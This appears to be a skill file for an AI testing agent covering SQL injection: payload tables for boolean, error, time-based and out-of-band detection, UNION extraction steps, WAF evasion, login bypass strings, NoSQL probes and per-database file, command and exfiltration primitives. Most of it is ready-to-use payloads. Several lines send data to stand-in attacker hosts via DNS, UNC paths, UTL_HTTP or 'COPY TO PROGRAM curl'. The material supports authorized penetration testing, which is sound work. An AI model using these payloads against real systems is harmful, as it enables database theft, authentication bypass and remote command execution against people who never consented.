---
name: sql-injection
description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
---

# SQL Injection

SQLi remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect.

## Attack Surface

**Databases**
- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, reporting/exporters

**Input Locations**
- Path/query/body/header/cookie
- Mixed encodings (URL, JSON, XML, multipart)
- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs
- JSON coercion or array containment operators
- Batch/bulk endpoints and report generators that embed filters directly

## Detection Channels

**Error-Based**
- Provoke type/constraint/parser errors revealing stack/version/paths

**Boolean-Based**
- Pair requests differing only in predicate truth
- Diff status/body/length/ETag

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- Use subselect gating to avoid global latency noise

**Out-of-Band (OAST)**
- DNS/HTTP callbacks via DB-specific primitives

## Payload Tables — per detection channel

Every payload states its channel and what confirms it. `CANARY` is a per-test
unique token; comment styles differ per DBMS and are noted inline.

### Boolean differential — the reliable oracle

Send both, compare status/length/ETag. A differential is the proof; error text is
a bonus.

| DBMS | True | False |
|---|---|---|
| generic string | `' AND 1=1-- -` | `' AND 1=2-- -` |
| numeric | ` AND 1=1` | ` AND 1=2` |
| MySQL | `' AND 1=1#` | `' AND 1=2#` |
| Oracle | `' AND 1=1--` | `' AND 1=2--` (no `-- -`) |
| MSSQL | `' AND 1=1--` | `' AND 1=2--` |
| Postgres | `' AND 1=1--` | `' AND 1=2--` |

### Error-based — when errors are surfaced

| DBMS | Payload | Leaks |
|---|---|---|
| MySQL | `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -` | version in `XPATH syntax error: '~x'` |
| MySQL | `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -` | duplicate-entry leak |
| Postgres | `' AND 1=CAST((SELECT current_database()) AS NUMERIC)-- -` | `invalid input syntax for type numeric: "dbname"` |
| MSSQL | `' AND 1=CONVERT(int,(SELECT @@version))--` | conversion error leaks version |
| Oracle | `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--` | `DRG-10800` leaks the banner |
| SQLite | `' AND 1=CAST((SELECT sqlite_version()) AS NUMERIC)--` | `datatype mismatch` with the value |

### Time-based — when responses are otherwise identical

Always pair with a control request; measure the delta, not the latency.

| DBMS | Payload | Delay |
|---|---|---|
| MySQL | `' AND SLEEP(5)-- -` | 5s |
| MySQL (sleep blocked) | `' AND BENCHMARK(50000000,MD5('x'))-- -` | CPU-bound, ~2-5s |
| Postgres | `'; SELECT pg_sleep(5)--` | 5s |
| MSSQL | `'; WAITFOR DELAY '0:0:5'--` | 5s |
| Oracle | `' AND dbms_pipe.receive_message(('a'),5)='a'--` | 5s |
| SQLite | `' AND 1=randomblob(500000000)/1000000000--` | heavy, seconds |

### Out-of-band — the strongest single-shot confirmation

| DBMS | Payload | Transport |
|---|---|---|
| MySQL (Windows) | `' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.<collab>\\\\a'))-- -` | DNS |
| MSSQL | `'; EXEC master..xp_dirtree '\\\\<collab>\\x'--` | DNS/NTLM |
| Oracle | `' AND UTL_HTTP.request('http://<collab>/'||user)='1'--` | HTTP |
| Postgres | `COPY (SELECT '') TO PROGRAM 'curl http://<collab>/'` | HTTP (superuser) |

### UNION extraction ladder

1. Column count: `ORDER BY N` until it errors — or `' UNION SELECT NULL,NULL,...-- -`
2. Find text columns: replace each NULL with `CANARY` until it echoes
3. Extract: `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`
4. Then `SELECT column_name FROM information_schema.columns WHERE table_name='<t>'`
5. Then the data — one row at a time for evidence, not a bulk dump

### WAF evasion ladder — try in order, stop when one works

| Technique | Example |
|---|---|
| inline comment | `UN/**/ION SE/**/LECT` |
| version comments (MySQL) | `/*!50000UNION*//*!50000SELECT*/` |
| case | `uNiOn SeLeCt` |
| double URL-encode | `%2527` |
| whitespace substitution | `UNION%09SELECT`, `UNION%0aSELECT` |
| null byte (legacy) | `%00` before the payload |
| encoding the quote | `'` → `%27` → `%2527` |
| keyword splitting across params | `?q=UNION&q=SELECT` (HPP) |

### Authentication bypass — login forms

| Payload | Effect |
|---|---|
| `' OR 1=1-- -` | classic; works on naive concatenation |
| `admin'-- -` | comment out the password check |
| `' OR '1'='1` | no comment needed |
| `') OR 1=1-- -` | parenthesised query |
| `' OR 1=1 LIMIT 1#` | returns one row where many would error |

### NoSQL / non-SQL siblings (quick reference)

| Backend | Probe |
|---|---|
| MongoDB | `{"$ne": null}`, `{"$gt": ""}`, `{"$regex": ".*"}` |
| MongoDB auth bypass | `{"user": {"$ne": ""}, "pass": {"$ne": ""}}` |
| CouchDB | `?startkey="_design"&endkey="_design\uffff"` |
| Redis (if reachable) | `KEYS *`, `EVAL "return 1" 0` |

### Proof standard

| Claim | Minimum evidence |
|---|---|
| SQLi exists | boolean differential with two requests, or a time delta > 3× baseline |
| data read | table name + one record — not "data returned" |
| file read | `LOAD_FILE`/`pg_read_file` output of `/etc/hostname` |
| write | `INTO OUTFILE` landing, fetched back |
| RCE | `xp_cmdshell`/`COPY TO PROGRAM` output with a fresh canary |

## DBMS Primitives

### MySQL

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older), JSON functions for error shaping
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege, secure_file_priv)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- Time: `SLEEP(n)`, `BENCHMARK`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS funcs sometimes leak

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`
- Error-based: raise exception via unsupported casts or division by zero; `xpath()` errors in xml2
- OOB: `COPY (program ...)` or dblink/foreign data wrappers (when enabled); http extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (requires superuser), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` with lateral/CTE for blind extraction

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) if enabled
- Exec: `xp_cmdshell` (often disabled), `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy functions cause measurable delays
- Error-based: convert/parse, divide by zero, `FOR XML PATH` leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permissions dependent)
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date` conversions, `XMLType`
- File: `UTL_FILE` with directory objects (privileged)

## Key Vulnerabilities

### UNION-Based Extraction

- Determine column count and types via `ORDER BY n` and `UNION SELECT null,...`
- Align types with `CAST`/`CONVERT`; coerce to text/json for rendering
- When UNION is filtered, switch to error-based or blind channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Binary search on character space for fewer requests
- Encode outputs (hex/base64) to normalize
- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to minimize noise and bypass strict response paths
- Embed data in DNS labels or HTTP query params
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks
- Privilege changes: update role/plan/feature flags when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, `xp_cmdshell` redirection
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER clauses
- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
- JSON containment operators exposed by ORMs (e.g., `@>` in PostgreSQL) with raw fragments
- Parameter mismatch: partial parameterization where operators or lists remain unbound (`IN (...)`)

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` for boolean channels
- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
- Full-text/search helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with payload mixing
- XML/JSON functions: error generation via malformed documents/paths

## Bypass Techniques

**Whitespace/Spacing**
- `/**/`, `/**/!00000`, comments, newlines, tabs
- `0xe3 0x80 0x80` (ideographic space)

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks/quotes, case folding

**Numeric Tricks**
- Scientific notation, signed/unsigned, hex (`0x61646d696e`)

**Encodings**
- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
- `char()`/`CONCAT_ws` to build tokens

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to hide payload shape

## Testing Methodology

1. **Identify query shape** - SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET
2. **Determine input influence** - User input in identifiers vs values
3. **Confirm injection class** - Reflective errors, boolean diffs, timing, or out-of-band callbacks
4. **Choose quietest oracle** - Prefer error-based or boolean over noisy time-based
5. **Establish extraction channel** - UNION (if visible), error-based, boolean bit extraction, time-based, or OAST/DNS
6. **Pivot to metadata** - version, current user, database name
7. **Target high-value tables** - auth bypass, role changes, filesystem access if feasible

## Validation

1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
2. Extract verifiable metadata (version, current user, database name) using the established channel
3. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope
4. Provide reproducible requests that differ only in the injected fragment
5. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant)

## False Positives

- Generic errors unrelated to SQL parsing or constraints
- Static response sizes due to templating rather than predicate truth
- Artificial delays from network/CPU unrelated to injected function calls
- Parameterized queries with no string concatenation, verified by code review

## Impact

- Direct data exfiltration and privacy/regulatory exposure
- Authentication and authorization bypass via manipulated predicates
- Server-side file access or command execution (platform/privilege dependent)
- Persistent supply-chain impact via modified data, jobs, or procedures

## Pro Tips

1. Pick the quietest reliable oracle first; avoid noisy long sleeps
2. Normalize responses (length/ETag/digest) to reduce variance when diffing
3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise
4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available
5. Treat ORMs as thin wrappers: raw fragments often slip through; audit `whereRaw`/`orderByRaw`
6. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly
7. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels
8. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types
9. Validate mitigations with negative tests and code review; parameterize operators/lists correctly
10. Document exact query shapes; defenses must match how the query is constructed, not assumptions

## Summary

Modern SQLi succeeds where authorization and query construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets SQL.
